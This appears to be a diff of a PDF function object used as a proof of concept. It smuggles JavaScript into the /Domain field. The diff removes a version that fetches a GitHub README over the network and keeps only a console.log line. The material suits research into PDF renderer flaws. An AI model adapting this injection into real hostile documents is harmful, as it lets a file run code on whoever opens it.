@@ -2,15 +2,7 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(console.log("Starting PoC"),
-fetch(
-  new Request('https://raw.githubusercontent.com/saup/PoC/refs/heads/main/README.md')
-).then(function(response) {
-  return response.text()
-}).then(function(text) {
-  console.log(text);
-})
-) 0]
+  /Domain [(console.log("Starting PoC")) 0]
   /Range [0 0]
   /Length 12
 >>
